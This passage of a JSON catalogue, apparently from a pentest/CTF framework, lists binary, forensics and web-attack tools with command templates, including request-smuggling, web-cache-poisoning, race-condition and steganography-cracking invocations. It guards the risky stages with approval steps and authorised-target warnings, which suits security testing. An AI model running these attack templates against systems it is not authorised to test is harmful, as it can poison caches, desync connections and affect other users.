        "automated input discovery"
      ],
      "docs": "https://docs.angr.io/",
      "templates": [
        {
          "label": "Symbolic-exec skeleton",
          "template": "/opt/angr/venv/bin/python3 -c 'import angr; p = angr.Project(\"<binary>\"); sm = p.factory.simulation_manager(); sm.explore(find=lambda s: b\"flag\" in s.posix.dumps(1))'",
          "note": "A python3 -c skeleton — arbitrary code, so it trips the red-confirm. Loads the binary and explores paths; it does not run the file natively."
        }
      ]
    },
    {
      "name": "libc-database",
      "category": "binary-re",
      "purpose": "Identifies an unknown libc from a few leaked symbol addresses and looks up other symbol offsets — the bridge from one leak to a full libc base.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "libc identification",
        "offset lookup"
      ],
      "docs": "https://github.com/niklasb/libc-database",
      "templates": [
        {
          "label": "Identify a libc from a leaked symbol",
          "template": "/opt/libc-database/find <symbol> <offset>",
          "note": "Needs a built local DB (run ./get in an egress-enabled sandbox first). Matches on the low bits of the leaked address."
        }
      ]
    },
    {
      "name": "pwninit",
      "category": "binary-re",
      "purpose": "Automates CTF pwn setup — patches the challenge binary to use a provided libc and loader and writes an exploit template.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "challenge setup",
        "libc patching"
      ],
      "docs": "https://github.com/io12/pwninit",
      "templates": [
        {
          "label": "Patch a binary to a supplied libc",
          "template": "pwninit --bin <binary> --libc <libc>",
          "note": "Writes a patched copy of the local binary; runs nothing."
        }
      ]
    },
    {
      "name": "volatility3",
      "aliases": [
        "vol",
        "vol.py"
      ],
      "category": "forensics-ctf",
      "purpose": "Memory-forensics framework — process lists, network artefacts, credentials and injected code from a RAM image or crash dump.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "memory forensics",
        "process enumeration",
        "artifact extraction"
      ],
      "docs": "https://volatility3.readthedocs.io/",
      "templates": [
        {
          "label": "Windows process list",
          "template": "vol -f <file> windows.pslist",
          "note": "Reads the memory image; v3 auto-detects the symbol set."
        },
        {
          "label": "Process command lines",
          "template": "vol -f <file> windows.cmdline",
          "note": "What each process was launched with — a fast triage view."
        },
        {
          "label": "File objects in memory",
          "template": "vol -f <file> windows.filescan",
          "note": "File objects present in the dump; pair with dumpfiles to extract."
        }
      ]
    },
    {
      "name": "binwalk",
      "category": "forensics-ctf",
      "purpose": "Firmware / blob analyzer — finds and extracts embedded files, filesystems and compressed streams inside a larger file.",
      "phases": [
        "recon",
        "exploitation"
      ],
      "techniques": [
        "firmware analysis",
        "file carving",
        "entropy analysis"
      ],
      "docs": "https://github.com/ReFirmLabs/binwalk",
      "templates": [
        {
          "label": "Signature scan",
          "template": "binwalk <file>",
          "note": "Read-only: reports embedded file signatures and their offsets."
        },
        {
          "label": "Extract embedded files",
          "template": "binwalk -e <file>",
          "note": "Carves recognised streams into a local extraction dir (writes files)."
        }
      ]
    },
    {
      "name": "foremost",
      "category": "forensics-ctf",
      "purpose": "Header/footer file carver — recovers files (images, archives, documents) from a disk image or arbitrary blob.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "file carving",
        "data recovery"
      ],
      "docs": "https://foremost.sourceforge.net/",
      "templates": [
        {
          "label": "Carve into an output dir",
          "template": "foremost -i <file> -o <output>",
          "note": "Writes recovered files under <output>; the input is read read-only."
        }
      ]
    },
    {
      "name": "scalpel",
      "category": "forensics-ctf",
      "purpose": "Fast, configuration-driven file carver — a foremost descendant that carves by patterns defined in scalpel.conf.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "file carving",
        "data recovery"
      ],
      "docs": "https://github.com/sleuthkit/scalpel",
      "templates": [
        {
          "label": "Carve into an output dir",
          "template": "scalpel <file> -o <output>",
          "note": "Enable the wanted patterns in /etc/scalpel/scalpel.conf first; writes to <output>."
        }
      ]
    },
    {
      "name": "steghide",
      "category": "forensics-ctf",
      "purpose": "Classic steganography tool — hides and EXTRACTS data embedded in JPEG/BMP/WAV/AU carriers, optionally passphrase-protected.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "steganography",
        "data extraction"
      ],
      "docs": "https://steghide.sourceforge.net/",
      "templates": [
        {
          "label": "Extract hidden data",
          "template": "steghide extract -sf <file>",
          "note": "Prompts for a passphrase; add -p <password> when it is known."
        },
        {
          "label": "Show carrier info",
          "template": "steghide info <file>",
          "note": "Reports capacity and whether an embedded object is present."
        }
      ]
    },
    {
      "name": "zsteg",
      "category": "forensics-ctf",
      "purpose": "Detects LSB and other steganography in PNG and BMP images — the go-to for CTF image stego.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "LSB steganography",
        "image analysis"
      ],
      "docs": "https://github.com/zed-0xff/zsteg",
      "templates": [
        {
          "label": "Scan all channels",
          "template": "zsteg -a <file>",
          "note": "Read-only: tries every bit-plane and channel ordering."
        }
      ]
    },
    {
      "name": "stegseek",
      "category": "forensics-ctf",
      "purpose": "Ultra-fast steghide brute-forcer — recovers a steghide passphrase and the embedded payload from a wordlist in seconds.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "steganography",
        "passphrase cracking"
      ],
      "docs": "https://github.com/RickdeJager/stegseek",
      "templates": [
        {
          "label": "Crack with a wordlist",
          "template": "stegseek <file> <wordlist>",
          "note": "Reads the carrier; on success writes the extracted payload beside it. Offline, like hashcat."
        }
      ]
    },
    {
      "name": "exiftool",
      "category": "forensics-ctf",
      "purpose": "Reads and writes metadata in images, documents and media — EXIF/IPTC/XMP GPS, timestamps, comments and hidden fields.",
      "phases": [
        "recon",
        "exploitation"
      ],
      "techniques": [
        "metadata extraction",
        "EXIF analysis"
      ],
      "docs": "https://exiftool.org/",
      "templates": [
        {
          "label": "All metadata",
          "template": "exiftool <file>",
          "note": "Read-only: dumps every tag, including GPS and embedded comments."
        }
      ]
    },
    {
      "name": "bulk_extractor",
      "category": "forensics-ctf",
      "purpose": "Scans a disk image or file for features — emails, URLs, card numbers, crypto keys — without parsing the filesystem.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "feature extraction",
        "artifact carving"
      ],
      "docs": "https://github.com/simsong/bulk_extractor",
      "templates": [
        {
          "label": "Extract features to a dir",
          "template": "bulk_extractor -o <output> <file>",
          "note": "Writes per-feature text files under <output>; the input is read read-only."
        }
      ]
    },
    {
      "name": "testdisk",
      "aliases": [
        "photorec"
      ],
      "category": "forensics-ctf",
      "purpose": "Partition-recovery and file-carving suite — TestDisk repairs partition tables; PhotoRec carves files by signature from a disk image.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "partition recovery",
        "file carving"
      ],
      "docs": "https://www.cgsecurity.org/wiki/TestDisk",
      "templates": [
        {
          "label": "Analyse an image (TestDisk)",
          "template": "testdisk /log <file>",
          "note": "Partition analysis of the image; writes only its own log."
        },
        {
          "label": "Carve files (PhotoRec)",
          "template": "photorec /log /d <output> <file>",
          "note": "Signature-based recovery into <output>; the input is read read-only."
        }
      ]
    },
    {
      "name": "race-singlepacket",
      "category": "web",
      "purpose": "Single-packet / last-byte-sync race client — fires one request N times so the copies arrive in the same instant, to hit limit-overrun / TOCTOU / coupon-reuse / one-time-token races the serial intruder cannot.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "race condition",
        "HTTP/2 single-packet attack",
        "HTTP/1.1 last-byte synchronization",
        "TOCTOU"
      ],
      "docs": "https://portswigger.net/research/smashing-the-state-machine",
      "templates": [
        {
          "label": "HTTP/2 single-packet race (:race job, stdin)",
          "template": "race-singlepacket --job-stdin",
          "note": "The whole request (URL, headers, body, mode, N) is delivered as JSON on stdin — no request byte reaches a shell. This is how the :race job invokes it."
        },
        {
          "label": "HTTP/2 single-packet race (explicit)",
          "template": "race-singlepacket -u <target> -X POST -d '<payload>' --mode h2-single-packet -n 20",
          "note": "One H2 connection, N requests queued with the final frame withheld, then all released together."
        },
        {
          "label": "HTTP/1.1 last-byte race",
          "template": "race-singlepacket -u <target> -X POST -d '<payload>' --mode h1-last-byte -n 20",
          "note": "N connections, every byte but the last sent, then the last byte released on all together."
        }
      ],
      "flags": [
        {
          "flag": "--job-stdin",
          "what": "read the whole request as a JSON job on stdin (how HackPit invokes it)"
        },
        {
          "flag": "--mode",
          "what": "h2-single-packet (default) or h1-last-byte"
        },
        {
          "flag": "-n",
          "what": "N — how many synchronized copies to fire"
        }
      ]
    },
    {
      "name": "smuggle-probe",
      "category": "web",
      "purpose": "In-repo HTTP request-smuggling / desync prober — the :smuggle job's engine. Timing-differential DETECTION (safe, self-contained) by default; socket-poisoning CONFIRMATION as a separate approve-each. Probes CL.TE / TE.CL / CL.CL / TE.TE / CL.0 and the HTTP/2-downgrade H2.CL / H2.TE / H2.0 variants.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "HTTP request smuggling",
        "CL.TE / TE.CL / TE.TE desync",
        "HTTP/2 downgrade desync",
        "timing-differential detection",
        "response queue / cache poisoning"
      ],
      "docs": "https://portswigger.net/web-security/request-smuggling",
      "templates": [
        {
          "label": "detect + confirm (:smuggle job, stdin)",
          "template": "smuggle-probe --job-stdin",
          "note": "The whole request (URL, headers, body, mutation set, stage) is delivered as JSON on stdin — no request byte reaches a shell. This is how the :smuggle job invokes it. Stage 'detect' is timing-only and touches no other request; stage 'confirm' is the separately-approved socket-poisoning step."
        },
        {
          "label": "timing-differential detection (explicit)",
          "template": "smuggle-probe -u <url> -X POST --stage detect --mutations CL.TE,TE.CL,CL.0",
          "note": "For each mutation, times an ambiguous request against a baseline; a large delay means a front-end/back-end framing split. Self-contained — safe by default."
        },
        {
          "label": "socket-poisoning confirmation (co-tenant risk)",
          "template": "smuggle-probe -u <url> -X POST --stage confirm --mutations CL.TE",
          "note": "Smuggles a partial request then sends a normal one on the same connection to observe the poisoned response. CAN AFFECT CO-TENANT TRAFFIC on the shared connection — only on an authorised target."
        }
      ],
      "flags": [
        {
          "flag": "--job-stdin",
          "what": "read the whole request + mutation set as a JSON job on stdin (how HackPit invokes it)"
        },
        {
          "flag": "--stage",
          "what": "detect (safe timing-differential, default) or confirm (socket poisoning, co-tenant risk)"
        },
        {
          "flag": "--mutations",
          "what": "comma-separated: CL.TE,TE.CL,CL.CL,TE.TE,CL.0,H2.CL,H2.TE,H2.0"
        }
      ]
    },
    {
      "name": "smuggler.py",
      "aliases": ["smuggler"],
      "category": "web",
      "purpose": "defparam's CL/TE request-smuggling mutation prober — the standard headless smuggler. Walks a large set of Content-Length / Transfer-Encoding permutations against a target and reports which desync.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "HTTP request smuggling",
        "CL.TE / TE.CL / TE.TE desync",
        "header obfuscation"
      ],
      "docs": "https://github.com/defparam/smuggler",
      "templates": [
        {
          "label": "smuggle scan a URL",
          "template": "smuggler.py -u <url>",
          "note": "Runs the built-in mutation set; a DISCONNECT/TIMEOUT on a payload is the desync signal. Its transcript can be pasted back into :smuggle to land in the same verdict table."
        },
        {
          "label": "smuggle scan with a config",
          "template": "smuggler.py -u <url> -c default.py",
          "note": "Pick a mutation config; 'default.py' is the standard permutation set."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "target URL"
        },
        {
          "flag": "-c",
          "what": "mutation config file (default.py / doubles.py / exhaustive.py)"
        }
      ]
    },
    {
      "name": "h2csmuggler",
      "category": "web",
      "purpose": "assetnote/BishopFox h2c-upgrade smuggling client — tunnels requests past an edge proxy by upgrading a cleartext HTTP/2 (h2c) connection the intermediary mishandles.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "h2c upgrade smuggling",
        "HTTP/2 cleartext desync",
        "access-control bypass"
      ],
      "docs": "https://github.com/BishopFox/h2csmuggler",
      "templates": [
        {
          "label": "check for h2c smuggling",
          "template": "h2csmuggler -x <url> <target>",
          "note": "Attempts the h2c upgrade through the proxy at -x and, if it succeeds, sends the smuggled request to the target path/origin."
        }
      ],
      "flags": [
        {
          "flag": "-x",
          "what": "the front-end proxy URL to attempt the h2c upgrade against"
        }
      ]
    },
    {
      "name": "cache-probe",
      "category": "web",
      "purpose": "In-repo web-cache-poisoning / cache-deception prober — the :cache job's engine. Reflection + cacheability DETECTION (safe, plants nothing) by default; poison-plant CONFIRMATION as a separate approve-each. Probes unkeyed inputs (X-Forwarded-Host and friends, cloaked params, fat-GET body) and cache-deception path confusion.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "web cache poisoning",
        "unkeyed input reflection",
        "cache deception (path confusion)",
        "open-redirect / XSS via cached response"
      ],
      "docs": "https://portswigger.net/web-security/web-cache-poisoning",
      "templates": [
        {
          "label": "detect + confirm (:cache job, stdin)",
          "template": "cache-probe --job-stdin",
          "note": "The whole request (URL, headers, body, candidate-input set, stage) is delivered as JSON on stdin — no request byte reaches a shell. This is how the :cache job invokes it. Stage 'detect' plants no cache entry; stage 'confirm' is the separately-approved poison-plant step."
        },
        {
          "label": "reflection + cacheability detection (explicit)",
          "template": "cache-probe -u <url> --stage detect --inputs x-forwarded-host,x-forwarded-scheme,param-cloak --deception",
          "note": "For each candidate unkeyed input, marks it and reports whether the marker is reflected AND the response is cacheable; also runs the cache-deception path-confusion probes. Plants nothing — safe by default."
        },
        {
          "label": "poison-plant confirmation (co-user risk)",
          "template": "cache-probe -u <url> --stage confirm --inputs x-forwarded-host",
          "note": "Primes the cache with the marker request then fetches it back with a request that never carried the marker. CAN SERVE A POISONED RESPONSE TO OTHER USERS OF THE CACHE — only on an authorised target."
        }
      ],
      "flags": [
        {
          "flag": "--stage",
          "what": "detect (safe reflection+cacheability, the default) or confirm (poison-plant, co-user risk)"
        },
        {
          "flag": "--inputs",
          "what": "comma-separated candidate unkeyed inputs to probe (empty = the safe default set)"
        }
      ]
    },
    {
      "name": "wcvs",
      "category": "web",
      "purpose": "Hackmanit's Web-Cache-Vulnerability-Scanner — the standard external web-cache-poisoning scanner. Walks unkeyed-header, parameter-cloaking, fat-GET and normalization checks against a target and reports which inputs poison a shared cache.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "web cache poisoning",
        "unkeyed header / parameter cloaking",
        "cache deception",
        "response splitting via cache"
      ],
      "docs": "https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner",
      "templates": [
        {
          "label": "scan a URL for cache poisoning",
          "template": "wcvs -u <url>",
          "note": "Runs the built-in check set; a reflected + cacheable header is the poisoning signal. Its transcript can be pasted back into :cache to land in the same verdict table."
        },
        {
          "label": "scan with a generator config",
          "template": "wcvs -u <url> -gc default.json",
          "note": "Pick a generator config to widen the header / parameter permutations."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "the target URL to scan for cache poisoning"
        }
      ]
    }
  ]
}
